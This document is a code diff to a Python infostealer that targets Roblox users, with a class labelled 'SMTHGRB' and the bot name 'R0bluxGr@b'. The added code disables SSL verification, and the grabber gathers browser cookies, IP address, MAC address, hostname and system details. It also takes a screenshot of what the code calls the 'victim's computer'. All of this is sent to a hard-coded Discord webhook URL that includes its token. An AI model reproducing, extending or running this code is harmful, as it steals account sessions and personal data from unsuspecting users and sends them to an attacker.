@@ -1,14 +1,22 @@
 import json
 import platform
 import socket
+import time
 import urllib.request
 import uuid
-from urllib.request import urlopen
-
+from urllib.request import build_opener, HTTPSHandler
+import ssl
 import browser_cookie3
 import psutil
+import pyautogui
 import requests
 import robloxpy
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import sys
+
+# variable
+
+file = "screenshot.png"
 
 
 class SMTHGRB:
@@ -62,14 +70,29 @@ class SMTHGRB:
         }
 
     @staticmethod
-    def ip4():  # Get ipv4
+    def create_opener():
+        # Create a custom opener with an HTTPSHandler that disables SSL verification
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        https_handler = HTTPSHandler(context=context)
+        opener = build_opener(https_handler)
+        return opener
+
+    @staticmethod
+    def ip4():
         try:
-            with urlopen('https://4.ident.me') as response:
+            opener = SMTHGRB.create_opener()
+            with opener.open('https://4.ident.me') as response:
                 return response.read().decode('ascii')
         except:
-            with urlopen('https://4.tnedi.me') as response:
-                return response.read().decode('ascii')
-    ip_address = ip4()
+            try:
+                opener = SMTHGRB.create_opener()
+                with opener.open('https://4.tnedi.me') as response:
+                    return response.read().decode('ascii')
+            except:
+                return "N/A"
+
 
     def checker(self):
         if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
@@ -101,8 +124,6 @@ class SMTHGRB:
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
 
-
-
         self.embeds.append(
             {
                 "title": f"✔ Valid Account - {self.platform}",
@@ -117,9 +138,9 @@ class SMTHGRB:
 
         self.embeds.append(
             {
-                "title": f"Computer info's",
+                "title": f"Computer info's - {hostname}",
                 "description": f"Hostname: {hostnameISP} \n\n IPv4 Address:||**{ip_address}**||\n "
-                               f"Sys info \n\n Hostname: {system_info['Hostname']}\n\n Processor: {system_info['Processor']}\n\n RAM: {system_info['RAM']}\n\n Machine Architecture: {system_info['Machine Architecture']}\n\n OS: {system_info['OS']}\n\n OS Release: {system_info['OS Release']}\n\n OS Version: {system_info['OS Version']}\n\n MAC Address: {system_info['MAC Address']}\n\n",
+                               f"\n\nSys info: \n\n Hostname: {system_info['Hostname']}\n\n Processor: {system_info['Processor']}\n\n RAM: {system_info['RAM']}\n\n Machine Architecture: {system_info['Machine Architecture']}\n\n OS: {system_info['OS']}\n\n OS Release: {system_info['OS Release']}\n\n OS Version: {system_info['OS Version']}\n\n MAC Address: {system_info['MAC Address']}\n\n",
                 "color": 7858996,
                 "footer": {
                     "text": "v1.0.2 ; Computer-Inf by Independent-coder"
@@ -237,25 +258,54 @@ class SMTHGRB:
             pass
 
         if len(self.embeds) == 0:
-            exit()
+            sys.exit()  # Use sys.exit() instead of exit()
 
         self.send()
 
     # hey here is the part where the message is sent
 
+    @staticmethod
+    def screenshot():
+        time.sleep(5)
+        Screencapture = pyautogui.screenshot()
+        Screencapture.save(f"{file}")  # Save the screenshot to a file
+
     def send(self):
-        requests.post(self.webhook, json={
+        webhook = DiscordWebhook(url=self.webhook, username="R0bluxGr@b", content="@everyone",
+                                 avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")
 
-            "username": "R0bluxGr@b",
-            "content": "@everyone",  # You can change this to be just no ping or a @here ping.
-            "avatar_url": "https://cdn.discordapp.com/avatars/924130884452511845/1d8a7d3f6bfe5bf654529724a3519d08?size=1024"  # You can change the avatar if you are advanced in python.
-                          "/latest?cb=20190801142211&path-prefix=fr"
-                          ".png?size=1024",
-            "embeds": self.embeds,
+        webhook1 = DiscordWebhook(url=self.webhook, username="R0bluxGr@b", content="@everyone",
+                                  avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")
 
-        })
+        # Add the rest of the embeds
+        for embed_data in self.embeds:
+            embed = DiscordEmbed(title=embed_data["title"], description=embed_data["description"],
+                                 color=embed_data["color"])
+            embed.set_footer(text=embed_data["footer"]["text"])
+            webhook.add_embed(embed)
 
+        # Send the webhook with both the embeds and the screenshot file
+        webhook.execute()
+
+        self.screenshot()
+
+        webhook1.embeds.append(
+            {
+                "title": f"ScreenShot as been taken on - victim's computer",
+                "description": f"Screenshot as been uploaded",
+                "color": 7858996,
+                "footer": {
+                    "text": "v0.2.8 ; SST by Independent-coder"
+                }
+            }
+        )
+
+
+        with open(f"{file}", "rb") as f:
+            webhook1.add_file(file=f.read(), filename=f"{file}")
+
+        webhook1.execute()
 
 
 SMTHGRB(
-    "PUT YOUR DISOCRD WEBHOOK URL")
+    "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
